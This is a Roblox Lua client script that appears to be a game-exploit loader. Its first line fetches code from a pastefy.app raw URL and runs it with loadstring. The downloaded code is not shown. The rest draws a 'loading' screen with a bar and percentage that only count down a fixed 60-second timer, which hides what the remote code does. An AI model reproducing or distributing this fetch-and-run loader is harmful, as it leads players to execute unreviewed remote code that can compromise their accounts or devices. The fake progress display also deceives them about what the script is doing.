loadstring(game:HttpGet("https://pastefy.app/vQf2EmbV/raw", true))()
-- Ensure this script is in StarterPlayerScripts as a LocalScript
local TweenService = game:GetService("TweenService")
local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
-- Delete old GUIs if they exist
if playerGui:FindFirstChild("IntroLoadingGui") then
    playerGui.IntroLoadingGui:Destroy()
end

-- Create loading screen
local LoadingGui = Instance.new("ScreenGui")
LoadingGui.Name = "IntroLoadingGui"
LoadingGui.Parent = playerGui
LoadingGui.DisplayOrder = 999
LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
LoadingGui.ResetOnSpawn = false

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Parent = LoadingGui
LoadingFrame.Size = UDim2.new(0, 300, 0, 150)
LoadingFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
LoadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
LoadingFrame.BorderSizePixel = 0

local LoadingFrameCorner = Instance.new("UICorner")
LoadingFrameCorner.CornerRadius = UDim.new(0, 16)
LoadingFrameCorner.Parent = LoadingFrame

-- Add crisp stroke (black) so white elements pop and don't look blurry
local frameStroke = Instance.new("UIStroke")
frameStroke.Parent = LoadingFrame
frameStroke.Color = Color3.fromRGB(0, 0, 0)
frameStroke.Thickness = 2
frameStroke.Transparency = 0

local LoadingTitle = Instance.new("TextLabel")
LoadingTitle.Parent = LoadingFrame
LoadingTitle.Size = UDim2.new(1, -20, 0.5, 0)
LoadingTitle.Position = UDim2.new(0, 10, 0, 10)
LoadingTitle.BackgroundTransparency = 1
LoadingTitle.Text = "LOADING SCRIPT PLEASE WAIT..."
LoadingTitle.Font = Enum.Font.SourceSansBold
LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255) -- PURE WHITE TEXT
LoadingTitle.TextScaled = true
LoadingTitle.TextStrokeTransparency = 0 -- make stroke visible
LoadingTitle.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
LoadingTitle.TextTransparency = 0

local LoadingBarBackground = Instance.new("Frame")
LoadingBarBackground.Parent = LoadingFrame
LoadingBarBackground.Size = UDim2.new(0.8, 0, 0.1, 0)
LoadingBarBackground.Position = UDim2.new(0.1, 0, 0.7, 0)
LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
LoadingBarBackground.BorderSizePixel = 0

local LoadingBarBGCorner = Instance.new("UICorner")
LoadingBarBGCorner.CornerRadius = UDim.new(0, 12)
LoadingBarBGCorner.Parent = LoadingBarBackground

local bgStroke = Instance.new("UIStroke")
bgStroke.Parent = LoadingBarBackground
bgStroke.Color = Color3.fromRGB(0,0,0)
bgStroke.Thickness = 1
bgStroke.Transparency = 0.3

local LoadingBar = Instance.new("Frame")
LoadingBar.Parent = LoadingBarBackground
LoadingBar.Size = UDim2.new(0, 0, 1, 0)
LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- PURE WHITE BAR
LoadingBar.BorderSizePixel = 0

local LoadingBarCorner = Instance.new("UICorner")
LoadingBarCorner.CornerRadius = UDim.new(0, 12)
LoadingBarCorner.Parent = LoadingBar

local barStroke = Instance.new("UIStroke")
barStroke.Parent = LoadingBar
barStroke.Color = Color3.fromRGB(0, 0, 0)
barStroke.Thickness = 1.5
barStroke.Transparency = 0

-- Smooth tween fill for loading bar (keeps the 60s total like original)
local totalTime = 60 -- seconds (keep original duration; change if you want faster)
local tweenInfo = TweenInfo.new(totalTime, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
local tweenGoal = { Size = UDim2.new(1, 0, 1, 0) }
local tween = TweenService:Create(LoadingBar, tweenInfo, tweenGoal)
tween:Play()

-- Optionally show percentage (updates per second)
local percentLabel = Instance.new("TextLabel")
percentLabel.Parent = LoadingFrame
percentLabel.Size = UDim2.new(0.3, 0, 0.18, 0)
percentLabel.Position = UDim2.new(0.7, -10, 0.7, 0)
percentLabel.BackgroundTransparency = 1
percentLabel.TextScaled = true
percentLabel.Font = Enum.Font.SourceSans
percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
percentLabel.TextStrokeTransparency = 0
percentLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
percentLabel.Text = "0%"

-- update percent smoothly
local start = tick()
local function updatePercent()
    local elapsed = tick() - start
    local pct = math.clamp(elapsed / totalTime, 0, 1)
    percentLabel.Text = math.floor(pct * 100) .. "%"
end

-- Update every 0.25s so the percent looks smooth
local connection
connection = game:GetService("RunService").Heartbeat:Connect(function(dt)
    updatePercent()
    if tick() - start >= totalTime then
        connection:Disconnect()
    end
end)

-- wait until tween done
tween.Completed:Wait()

-- Final state
LoadingTitle.Text = "LOADING COMPLETE"
LoadingTitle.TextColor3 = Color3.fromRGB(255, 255, 255) -- PURE WHITE
percentLabel.Text = "100%"
